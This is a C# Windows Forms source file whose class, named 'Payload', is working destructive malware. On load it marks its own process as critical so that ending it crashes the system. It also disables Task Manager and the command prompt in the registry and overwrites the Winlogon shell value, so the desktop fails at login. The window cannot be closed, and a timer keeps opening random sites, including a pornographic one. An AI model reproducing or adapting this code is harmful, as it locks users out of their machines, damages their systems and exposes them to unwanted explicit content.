﻿using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace Common
{
    public partial class Payload : Form
    {

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        public Payload()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
            TopMost = true;
            r = new Random();
        }
        Random r;

        private void Payload_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void Payload_Load(object sender, EventArgs e)
        {
            int isCritical = 1;
            int BreakOnTermination = 0x1D;

            Process.EnterDebugMode();

            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            RegistryKey reg = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            reg.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
            RegistryKey reg2 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\System");
            reg2.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
            RegistryKey reg3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            reg3.SetValue("Shell", "nothingness", RegistryValueKind.String);

            timer1.Start();
            timer2.Start();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            timer1.Stop();
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            timer2.Stop();
            int true_num = r.Next(5);

            if (true_num == 1)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?sxsrf=ALeKk03oEWfK0Z15S_E5Z0F4mh6O_ON9SQ%3A1606918611205&source=hp&ei=06HHX62hCuiR4-EPlJeNwAI&q=how+to+create+a+ransomware&oq=how+to+create+a+ransomware&gs_lcp=CgZwc3ktYWIQAzIFCAAQyQMyAggAMgIIADICCAAyAggAMgIIADIGCAAQFhAeMgYIABAWEB4yBggAEBYQHjIGCAAQFhAeOgQIIxAnOgUIABCRAjoFCAAQsQM6DgguELEDEIMBEMcBEKMCOggIABCxAxCDAToLCC4QsQMQxwEQowI6CAgAEMkDEJECOgQIABADUPkKWNphYNpmaABwAHgAgAF0iAG1EpIBBDIxLjWYAQCgAQGqAQdnd3Mtd2l6&sclient=psy-ab&ved=0ahUKEwjt1oGovq_tAhXoyDgGHZRLAygQ4dUDCAc&uact=5");
            }

            if (true_num == 2)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?sxsrf=ALeKk03xQE9PwKkHUeXFLNpDV2iUEw2xDA%3A1606918625695&ei=4aHHX4rvKbOH4-EPreSYqA4&q=noescape.exe+%28creepypasta%29&oq=noes&gs_lcp=CgZwc3ktYWIQARgAMgQIIxAnMgQIIxAnMgQIIxAnMgsILhDHARCvARDJAzICCAAyAggAMgIIADICCAAyAggAMgIILjoECAAQRzoFCAAQkQI6BQgAELEDOgQILhAnOggIABDJAxCRAjoECAAQQzoOCC4QsQMQgwEQxwEQrwE6CAgAELEDEIMBOgUILhCxA1CAsQFY3bUBYJm-AWgAcAJ4AIABkAGIAdUDkgEDMS4zmAEAoAEBqgEHZ3dzLXdpesgBCMABAQ&sclient=psy-ab");
            }

            if (true_num == 3)
            {
                System.Diagnostics.Process.Start("http://porntube.com/");
            }

            if (true_num == 4)
            {
                System.Diagnostics.Process.Start("https://youareanidiot.cc");
            }

            if (true_num == 5)
            {
                System.Diagnostics.Process.Start("http://youdontknowwhoiam.org");
            }
            timer2.Start();
        }
    }
}
